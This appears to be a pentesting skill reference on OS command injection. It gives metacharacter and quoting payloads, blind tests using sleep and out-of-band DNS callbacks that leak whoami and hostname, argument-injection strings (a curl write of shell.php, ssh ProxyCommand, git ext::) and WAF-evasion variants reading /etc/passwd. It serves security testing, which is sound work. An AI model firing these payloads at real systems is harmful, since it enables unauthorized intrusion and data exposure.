# OS Command Injection — Deep Workflows

Companion to SKILL.md. Metacharacter matrix, blind confirmation, argument
injection.

## Step 1: Identify command-executing features

```text
Typical features: file converters (pdf/image/video), ping/traceroute
diagnostics, DNS lookup tools, export/report generators, backup buttons,
webhook verifiers (curl/wget server-side), filename processors, archive
extractors (zip/tar handling symlinks), printer integrations.
```

## Step 2: Metacharacter matrix by shell context

```text
Sequential:      ; command        %0a command (newline)
Conditional:     && command       || command
Inline:          $(command)       `command`
Pipe:            | command
Background:      & command &
Windows cmd:     & dir  | dir  && dir
Quoted context:  ';command'  ";command"  $(command inside "")
```

Detection payload set (harmless, observable):
```bash
;sleep 7        || sleep 7      && sleep 7
$(sleep 7)      `sleep 7`       | sleep 7
;nslookup <oob-host>            # OOB variant
```

## Step 3: Blind confirmation techniques

```bash
# Time-based (measure TTFB delta across 3 runs):
?host=127.0.0.1;sleep(7)         # PHP-ish
?host=127.0.0.1%0asleep 7        # newline injection

# OOB-based (strongest signal):
?host=$(whoami).<oob-sub.oast.pro>
?host=`hostname`.<oob-sub.oast.pro>
# Windows:
?host=%USERNAME%.<oob-sub.oast.pro>

# Output reflection trick when output is discarded but response length varies:
?file=x;ls>/tmp/o;wc -c</tmp/o    # then leak via error message
```

## Step 4: Quoting-context escapes

If injection lands INSIDE quotes (`sh -c 'ping "$INPUT"'`):

```text
' ; sleep 7 ; echo '
" ; sleep 7 ; echo "
\`; sleep 7;\`           inside double quotes backticks still run
$(sleep 7)               works inside double quotes
```

## Step 5: Argument injection (no metacharacters needed)

When input becomes an ARGUMENT to a fixed binary:

```bash
# curl/wget server-side: write fetched file anywhere
?url=--output=/var/www/html/shell.php --url=<attacker>

# ssh/scp: execute remote command
?host=-oProxyCommand=bash -c id|

# tar/zip extractors: path traversal flags
--absolute-names / --transform

# git clients: ext:: transport RCE pattern (documented CVE class)
repo=ext::sh -c id
```

Check which binary runs by timing/error fingerprint before crafting flags.

## Step 6: WAF evasion variants (post-block only)

```text
Whitespace:   ${IFS}  $IFS$9  {cat,/etc/passwd}  < / </etc/passwd
Case tricks:  cAt /etc/*passwd*   (globbing)
Encoding:     %0A newline, %27 quotes, double-encode %2527
Concatenation: a=sl;b=eep;$a$b 7
Char classes: [x]y glob patterns
```

## False-positive elimination

1. Time delay must be consistent (>=3 runs, control test with sleep 0).
2. OOB callback must come from target egress IP, not your own prefetch.
3. Rule out framework-level "sleep" params (some APIs accept delay args).

## Severity guidance

Blind execution as low-priv container user: High (CVSS 8.8). With secret
read/env vars: Critical. Prove via `id` + one env var name ONLY (redact
values). Use assets/report-template.md.
